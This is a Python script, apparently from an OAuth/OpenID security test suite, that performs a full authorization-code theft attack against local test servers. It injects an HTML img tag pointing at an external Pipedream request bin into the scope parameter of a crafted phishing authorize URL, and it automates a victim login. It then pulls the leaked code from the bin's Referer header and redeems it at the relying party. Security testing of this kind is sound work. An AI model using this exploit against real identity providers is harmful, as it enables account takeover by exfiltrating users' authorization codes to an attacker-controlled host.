import sys
import os
import requests
import urllib

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '../../osbtlib'))

from osbtlib import BrowserSimulator, Osbtlib

HONEST_RP_ENDPOINT = "http://localhost:3000"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

PIPEDREAM_URL = os.environ.get('PIPEDREAM_URL')
PIPEDREAM_TOKEN = os.environ.get('PIPEDREAM_TOKEN')
PIPEDREAM_SOURCE_ID = os.environ.get('PIPEDREAM_SOURCE_ID') 

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)

try:
    # URL parameters should be URL safe
    redirect_uri = urllib.parse.quote(HONEST_RP_ENDPOINT + '/callback', safe='')
    scope_param = urllib.parse.quote('<img/src="' + PIPEDREAM_URL + '">', safe='')

    # construct the phishing URL with the URL safe parameters
    fising_url = f'{HONEST_OP_ENDPOINT}/authorize?response_type=code&client_id=client&redirect_uri={redirect_uri}&state=state&scope={scope_param}'
    print(fising_url)

    bs = BrowserSimulator(fising_url, PROXY_SERVER_ENDPOINT)
    sso_flow = f"""
page.locator('input[name="userId"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('input[type="submit"]').click()
page.locator('input[type="submit"][value="Yes"]').click()
    """
    bs.run(sso_flow)

    # check requestbin history
    history = osbt.requestbin.get_requestbin_history(PIPEDREAM_TOKEN, PIPEDREAM_SOURCE_ID)
    url = history['data'][0]['event']['headers']['referer']
    qs = urllib.parse.urlparse(url).query
    qs_d = urllib.parse.parse_qs(qs)
    code = qs_d["code"][-1]
    assert(code != None)

    # get access token
    bs.visit(f'{HONEST_RP_ENDPOINT}/callback?code={code}&state=state')
    print(bs.get_content())

except Exception as e:
    print('Error:', e)
